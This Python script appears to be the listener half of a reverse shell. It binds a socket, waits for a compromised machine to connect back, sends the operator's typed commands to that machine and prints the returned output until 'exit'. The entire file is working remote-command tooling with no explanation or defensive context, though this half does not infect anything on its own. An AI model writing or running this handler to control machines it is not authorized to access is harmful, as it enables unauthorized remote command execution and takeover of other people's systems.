import socket, subprocess as sp,sys

try :
    host = sys.argv[1]
except :
    host=''
    
try: 
    port= int(sys.argv[2])
except:
    port=8080
while 1:     
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host,port))
        s.listen()
        print("### Listening on %s:%d" %(host,port))
        conn, addr = s.accept()
        with conn :
            conn.settimeout(1)
            print("### Connection established with : "+ str(addr[0]))

            while 1:
                command = input(">>> ")
                if command !="exit":
                    if command =="": continue
                    conn.sendall(bytes(command,encoding='utf-8'))
                    fragments=[]
                    while True :
                        try :
                            chunk = conn.recv(1024).decode("utf-8")
                        except:
                            break
                        if not chunk: break
                        fragments.append(chunk)
                    result=''.join(fragments)
                    print (result)
                else :
                    conn.sendall(b"exit")
                    print ("### Connection closed")
                    break
